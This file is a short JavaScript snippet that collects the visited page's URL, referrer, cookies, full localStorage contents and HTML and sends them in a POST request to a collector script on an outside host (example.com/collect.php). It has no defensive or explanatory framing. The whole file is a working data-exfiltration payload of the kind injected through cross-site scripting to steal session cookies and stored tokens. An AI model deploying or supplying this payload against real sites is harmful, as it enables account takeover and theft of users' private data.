// Get data
var time = new Date().toString();
var url = window.location.href;
var referrer = document.referrer;
var cookies = document.cookie;
var local_storage = JSON.stringify(localStorage);
var html = document.documentElement.innerHTML;

// Create a new XMLHttpRequest
var xhr = new XMLHttpRequest();

// Configure it: POST-request for the URL /collect.php
xhr.open('POST', '//example.com/collect.php', true);

// Send the proper header information along with the request
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

// Prepare data
var data = 'time=' + encodeURIComponent(time) +
    '&url=' + encodeURIComponent(url) +
    '&referrer=' + encodeURIComponent(referrer) +
    '&cookies=' + encodeURIComponent(cookies) +
    '&local_storage=' + encodeURIComponent(local_storage) +
    '&html=' + encodeURIComponent(html);

// Send request
xhr.send(data);